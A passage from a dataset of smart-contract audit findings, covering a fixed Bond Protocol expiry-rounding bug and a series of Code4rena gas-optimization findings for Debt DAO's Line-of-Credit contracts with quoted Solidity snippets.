Discussion\n\n**Evert0x**\n\nMessage from sponsor\n\n----\n\nAgree with this finding. We implemented rounding of the expiry before checking whether it is in the past to both the Fixed Term and Fixed Expiry Tellers (fixed expiry added since we made a change to round these to the nearest day as well).\n\n\n**xiaoming9090**\n\nFixed in https://github.com/Bond-Protocol/bonds/commit/54b6833a46b5ae4c3a3ca183b9a55ca8c1266827",
      "summary": "\nThis bug report is about the Fixed Term Teller feature of Bond Protocol, which does not allow tokens to be created with a timestamp in the past. It was found by obront, who discovered that protocols can submit expiry timestamps slightly in the future, which correlate to tokenIds in the past, thus bypassing the check. This could lead to a major loss of funds for protocols building on top of Bond, and is considered a high severity issue. The code snippet and recommendation for fixing this issue are also included in the report. The sponsor replied that they have implemented rounding of the expiry before checking whether it is in the past, and the bug was fixed in a commit. \n\nIn summary, this bug report is about the Fixed Term Teller feature of Bond Protocol which allows protocols to bypass the check that all created tokens must have an expiry in the future. It was found by obront and the sponsor replied that they have implemented rounding of the expiry before checking whether it is in the past, and the bug was fixed in a commit.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Bond Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/34",
      "tags": [
        "Time Rounding",
        "Bond"
      ],
      "finders": [
        "obront"
      ]
    },
    {
      "id": "42984",
      "title": "[G-18]  Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement",
      "impact": "GAS",
      "content": "This change saves **[6 gas](https://aws1.discourse-cdn.com/business6/uploads/zeppelin/original/2X/3/363a367d6d68851f27d2679d10706cd16d788b96.png)** per instance. The optimization works until solidity version [0.8.13](https://gist.github.com/IllIllI000/bf2c3120f24a69e489f12b3213c06c94) where there is a regression in gas costs.\n\n*There are 3 instances of this issue:*\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n/// @audit (valid but excluded finding)\n91:           require(amount > 0);\n\n/// @audit (valid but excluded finding)\n161:          require(amount > 0);\n\n/// @audit (valid but excluded finding)\n198:          require(amount > 0);\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L91\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42983",
      "title": "[G-17]  Using `bool`s for storage incurs overhead",
      "impact": "GAS",
      "content": "```solidity\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n```\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27\nUse `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (**[100 gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)**) for the extra SLOAD, and to avoid Gsset (**20000 gas**) when changing from `false` to `true`, after having been `true` in the past\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/utils/MutualConsent.sol\n\n/// @audit (valid but excluded finding)\n15:       mapping(bytes32 => bool) public mutualConsents;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/MutualConsent.sol#L15\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42982",
      "title": "[G-16]  Functions guaranteed to revert when called by normal users can be marked `payable`",
      "impact": "GAS",
      "content": "\nIf a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are \n`CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost.\n\n*There are 4 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n340       function borrow(bytes32 id, uint256 amount)\n341           external\n342           override\n343           whileActive\n344           onlyBorrower\n345:          returns (bool)\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L340-L345\n\n```solidity\nFile: contracts/modules/credit/SecuredLine.sol\n\n48      function rollover(address newLine)\n49        external\n50        onlyBorrower\n51        override\n52:       returns(bool)\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L48-L52\n\n```solidity\nFile: contracts/modules/interest-rate/InterestRateCredit.sol\n\n34        function accrueInterest(\n35            bytes32 id,\n36            uint256 drawnBalance,\n37            uint256 facilityBalance\n38:       ) external override onlyLineContract returns (uint256) {\n\n74        function setRate(\n75            bytes32 id,\n76            uint128 dRate,\n77            uint128 fRate\n78:       ) external onlyLineContract returns (bool) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L34-L38\n\n___\n\n## Excluded findings\nThese findings are excluded from awards calculations because there are publicly-available automated tools that find them. The valid ones appear here for completeness\n\n## Gas Optimizations Summary\n| |Issue|Instances|Total Gas Saved|\n|-|:-|:-:|:-:|\n| [G&#x2011;17] | Using `bool`s for storage incurs overhead | 1 | 17100 |\n| [G&#x2011;18] | Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement | 3 | 18 |\n\nTotal: 4 instances over 2 issues with **17118 gas** saved\n\nGas totals use lower bounds of ranges and count two iterations of each `for`-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions. The table above as well as its gas numbers do not include any of the excluded findings.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42981",
      "title": "[G-15]  Use custom errors rather than `revert()`/`require()` strings to save gas",
      "impact": "GAS",
      "content": "\nCustom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/modules/interest-rate/InterestRateCredit.sol\n\n26            require(\n27                msg.sender == lineContract,\n28                \"InterestRateCred: only line contract.\"\n29:           );\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L26-L29\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42980",
      "title": "[G-14]  `require()` or `revert()` statements that check input arguments should be at the top of the function",
      "impact": "GAS",
      "content": "\nChecks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting a Gcoldsload (**2100 gas***) in a function that may ultimately revert in the unhappy case.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n/// @audit expensive op on line 324\n326:          require(amount <= credit.principal + credit.interestAccrued);\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L326\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42979",
      "title": "[G-13]  Inverting the condition of an `if`-`else`-statement wastes gas",
      "impact": "GAS",
      "content": "\nFlipping the `true` and `false` blocks instead saves ***[3 gas](https://gist.github.com/IllIllI000/44da6fbe9d12b9ab21af82f14add56b9)***.\n\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/utils/CreditLib.sol\n\n145:            decimals = !passed ? 18 : abi.decode(result, (uint8));\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L145\n\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n122                   deposit.asset = !is4626\n123                       ? token\n124:                      : abi.decode(tokenAddrBytes, (address));\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L122-L124\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42978",
      "title": "[G-12]  Using `private` rather than `public` for constants, saves gas",
      "impact": "GAS",
      "content": "\nIf needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that [returns a tuple](https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178) of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table.\n\n*There are 3 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n21:       uint256 public immutable deadline;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L21\n\n```solidity\nFile: contracts/modules/credit/SpigotedLine.sol\n\n32:       uint8 public immutable defaultRevenueSplit;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L32\n\n```solidity\nFile: contracts/modules/escrow/Escrow.sol\n\n24:       uint32 public immutable minimumCollateralRatio;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L24\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42977",
      "title": "[G-11]  Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead",
      "impact": "GAS",
      "content": "> When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.\n\nhttps://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html\nEach operation involving a `uint8` costs an extra [**22-28 gas**](https://gist.github.com/IllIllI000/9388d20c70f9a4632eb3ca7836f54977) (depending on whether the other operand is also a variable of type `uint8`) as compared to ones involving `uint256`, due to the compiler having to clear the higher bits of the memory word before operating on the `uint8`, as well as the associated stack operations of doing so. Use a larger size then downcast where needed.\n\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/utils/CreditLib.sol\n\n/// @audit uint8 decimals\n140:            decimals = 18;\n\n/// @audit uint8 decimals\n145:            decimals = !passed ? 18 : abi.decode(result, (uint8));\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L140\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42976",
      "title": "[G-10]  Optimize names to save gas",
      "impact": "GAS",
      "content": "\n`public`/`external` function names and `public` member variable names can be optimized to save gas. See [this](https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9) link for an example of how it works. Below are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save **128 gas** each during deployment, and renaming functions to have lower method IDs will save **22 gas** per call, [per sorted position shifted](https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92).\n\n*There are 15 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n/// @audit init(), healthcheck(), counts(), declareInsolvent()\n16:   contract LineOfCredit is ILineOfCredit, MutualConsent {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L16\n\n```solidity\nFile: contracts/modules/credit/SecuredLine.sol\n\n/// @audit liquidate()\n11:   contract SecuredLine is SpigotedLine, EscrowedLine, ISecuredLine {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L11\n\n```solidity\nFile: contracts/modules/credit/SpigotedLine.sol\n\n/// @audit unused(), claimAndRepay(), useAndRepay(), claimAndTrade(), updateOwnerSplit(), addSpigot(), updateWhitelist(), releaseSpigot(), sweep()\n22:   contract SpigotedLine is ISpigotedLine, LineOfCredit, ReentrancyGuard {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L22\n\n```solidity\nFile: contracts/modules/escrow/Escrow.sol\n\n/// @audit isLiquidatable(), updateLine(), addCollateral(), enableCollateral(), releaseCollateral(), getCollateralRatio(), getCollateralValue(), liquidate()\n19:   contract Escrow is IEscrow {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L19\n\n```solidity\nFile: contracts/modules/factories/LineFactory.sol\n\n/// @audit deployEscrow(), deploySpigot(), deploySecuredLine(), deploySecuredLineWithConfig(), deploySecuredLineWithModules(), rolloverSecuredLine()\n9:    contract LineFactory is ILineFactory {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/factories/LineFactory.sol#L9\n\n```solidity\nFile: contracts/modules/interest-rate/InterestRateCredit.sol\n\n/// @audit setRate()\n5:    contract InterestRateCredit is IInterestRateCredit {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L5\n\n```solidity\nFile: contracts/modules/oracle/Oracle.sol\n\n/// @audit getLatestAnswer()\n13:   contract Oracle is IOracle {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/oracle/Oracle.sol#L13\n\n```solidity\nFile: contracts/modules/spigot/Spigot.sol\n\n/// @audit operator(), claimRevenue(), claimEscrow(), operate(), addSpigot(), removeSpigot(), updateOwnerSplit(), updateOwner(), updateOperator(), updateTreasury(), updateWhitelistedFunction(), getEscrowed(), isWhitelisted(), getSetting()\n16:   contract Spigot is ISpigot, ReentrancyGuard {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L16\n\n```solidity\nFile: contracts/utils/CreditLib.sol\n\n/// @audit computeId(), getOutstandingDebt(), calculateValue(), create(), repay(), withdraw(), accrue()\n14:   library CreditLib {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L14\n\n```solidity\nFile: contracts/utils/CreditListLib.sol\n\n/// @audit removePosition(), stepQ()\n10:   library CreditListLib {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditListLib.sol#L10\n\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n/// @audit _getLatestCollateralRatio(), _getCollateralValue(), addCollateral(), enableCollateral(), releaseCollateral(), getCollateralRatio(), getCollateralValue(), liquidate(), isLiquidatable(), updateLine()\n21:   library EscrowLib {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L21\n\n```solidity\nFile: contracts/utils/LineFactoryLib.sol\n\n/// @audit rolloverSecuredLine(), transferModulesToLine(), deploySecuredLine()\n7:    library LineFactoryLib {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineFactoryLib.sol#L7\n\n```solidity\nFile: contracts/utils/LineLib.sol\n\n/// @audit sendOutTokenOrETH(), receiveTokenOrETH(), getBalance()\n14:   library LineLib {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L14\n\n```solidity\nFile: contracts/utils/SpigotedLineLib.sol\n\n/// @audit claimAndTrade(), trade(), rollover(), canDeclareInsolvent(), updateSplit(), releaseSpigot(), sweep()\n10:   library SpigotedLineLib {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L10\n\n```solidity\nFile: contracts/utils/SpigotLib.sol\n\n/// @audit _claimRevenue(), operate(), claimRevenue(), claimEscrow(), addSpigot(), removeSpigot(), updateOwnerSplit(), updateOwner(), updateOperator(), updateTreasury(), updateWhitelistedFunction(), getEscrowed(), isWhitelisted(), getSetting()\n23:   library SpigotLib {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L23\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42975",
      "title": "[G-09]  `require()`/`revert()` strings longer than 32 bytes cost extra gas",
      "impact": "GAS",
      "content": "\nEach extra memory word of bytes past the original 32 [incurs an MSTORE](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings) which costs **3 gas**.\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/modules/interest-rate/InterestRateCredit.sol\n\n26            require(\n27                msg.sender == lineContract,\n28                \"InterestRateCred: only line contract.\"\n29:           );\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L26-L29\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42974",
      "title": "[G-08]  `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops",
      "impact": "GAS",
      "content": "\nThe `unchecked` keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves **30-40 gas [per loop](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked)**.\n\n*There are 6 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n179:          for (uint256 i; i < len; ++i) {\n\n203:          for (uint256 i; i < len; ++i) {\n\n520:          for (uint256 i; i <= lastSpot; ++i) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L179\n\n```solidity\nFile: contracts/utils/CreditListLib.sol\n\n23:         for(uint256 i; i < len; ++i) {\n\n51:           for(uint i = 1; i < len; ++i) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditListLib.sol#L23\n\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n57:           for (uint256 i; i < length; ++i) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L57\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42973",
      "title": "[G-07]  Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement",
      "impact": "GAS",
      "content": "`require(a <= b); x = b - a` => `require(a <= b); unchecked { x = b - a }`\n\n*There are 3 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/SpigotedLine.sol\n\n/// @audit if-condition on line 120\n122:              unusedTokens[credit.token] -= repaid - newTokens;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L122\n\n```solidity\nFile: contracts/utils/SpigotedLineLib.sol\n\n/// @audit if-condition on line 100\n101:            uint256 diff = oldClaimTokens - newClaimTokens;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L101\n\n```solidity\nFile: contracts/utils/SpigotLib.sol\n\n/// @audit if-condition on line 95\n96:               require(LineLib.sendOutTokenOrETH(token, self.treasury, claimed - escrowedAmount));\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L96\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42972",
      "title": "[G-06]  `internal` functions only called once can be inlined to save gas",
      "impact": "GAS",
      "content": "\nNot inlining costs **20 to 40 gas** because of two extra `JUMP` instructions and additional stack operations needed for function calls.\n\n*There are 4 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n167       function _updateOutstandingDebt()\n168           internal\n169:          returns (uint256 principal, uint256 interest)\n\n435       function _createCredit(\n436           address lender,\n437           address token,\n438           uint256 amount\n439       )\n440           internal\n441:          returns (bytes32 id)\n\n516:      function _sortIntoQ(bytes32 p) internal returns (bool) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L167-L169\n\n```solidity\nFile: contracts/modules/interest-rate/InterestRateCredit.sol\n\n42        function _accrueInterest(\n43            bytes32 id,\n44            uint256 drawnBalance,\n45            uint256 facilityBalance\n46:       ) internal returns (uint256) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L42-L46\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42971",
      "title": "[G-05]  State variables should be cached in stack variables rather than re-reading them from storage",
      "impact": "GAS",
      "content": "\nThe instances below point to the second+ access of a state variable within a function. Caching of a state variable replaces each Gwarmaccess (**100 gas**) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.\n\n*There are 5 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n/// @audit count on line 499\n502:          if (count == 0) { _updateStatus(LineLib.STATUS.REPAID); }\n\n/// @audit ids on line 172\n180:              id = ids[i];\n\n/// @audit ids on line 201\n204:            id = ids[i];\n\n/// @audit ids on line 517\n521:              id = ids[i];\n\n/// @audit ids on line 532\n532:                  ids[i] = ids[nextQSpot];    // id put into old `p` position\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L502\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42970",
      "title": "[G-04]  Avoid contract existence checks by using low level calls",
      "impact": "GAS",
      "content": "\nPrior to 0.8.10 the compiler inserted extra code, including `EXTCODESIZE` (**100 gas**), to check for contract existence for external function calls. In more recent solidity versions, the compiler will not insert these checks if the external call has a return value. Similar behavior can be achieved in earlier versions by using low-level calls, since low level calls never check for contract existence\n\n*There are 27 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/SecuredLine.sol\n\n/// @audit status()\n57:       if(ILineOfCredit(newLine).status() != LineLib.STATUS.UNINITIALIZED) { revert BadNewLine(); }\n\n/// @audit init()\n63:       if(ILineOfCredit(newLine).init() != LineLib.STATUS.ACTIVE) { revert BadRollover(); }\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L57\n\n```solidity\nFile: contracts/utils/CreditLib.sol\n\n/// @audit getLatestAnswer()\n84:       int256 price = IOracle(oracle).getLatestAnswer(c.token);\n\n/// @audit getLatestAnswer()\n135:        int price = IOracle(oracle).getLatestAnswer(token);\n\n/// @audit accrueInterest()\n251:        uint256 accruedToken = IInterestRateCredit(interest).accrueInterest(\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L84\n\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n/// @audit updateOutstandingDebt()\n35:           (uint256 principal, uint256 interest) = ILineOfCredit(self.line).updateOutstandingDebt();\n\n/// @audit arbiter()\n105:          require(msg.sender == ILineOfCredit(self.line).arbiter());\n\n/// @audit getLatestAnswer()\n126:                  int256 price = IOracle(oracle).getLatestAnswer(deposit.asset);\n\n/// @audit status()\n173:            ILineOfCredit(self.line).status() != LineLib.STATUS.REPAID // if repaid, skip;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L35\n\n```solidity\nFile: contracts/utils/LineFactoryLib.sol\n\n/// @audit spigot()\n48:           address s = address(SecuredLine(oldLine).spigot());\n\n/// @audit escrow()\n49:           address e = address(SecuredLine(oldLine).escrow());\n\n/// @audit swapTarget()\n50:           address payable st = SecuredLine(oldLine).swapTarget();\n\n/// @audit defaultRevenueSplit()\n51:           uint8 split = SecuredLine(oldLine).defaultRevenueSplit();\n\n/// @audit init()\n72:           if(SecuredLine(payable(line)).init() != LineLib.STATUS.ACTIVE) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineFactoryLib.sol#L48\n\n```solidity\nFile: contracts/utils/LineLib.sol\n\n/// @audit safeTransfer()\n46:               IERC20(token).safeTransfer(receiver, amount);\n\n/// @audit transfer()\n48:               payable(receiver).transfer(amount);\n\n/// @audit safeTransferFrom()\n69:               IERC20(token).safeTransferFrom(sender, address(this), amount);\n\n/// @audit balanceOf()\n83:               IERC20(token).balanceOf(address(this)) :\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L46\n\n```solidity\nFile: contracts/utils/SpigotedLineLib.sol\n\n/// @audit claimEscrow()\n73:           uint256 claimed = ISpigot(spigot).claimEscrow(claimToken);\n\n/// @audit approve()\n134:              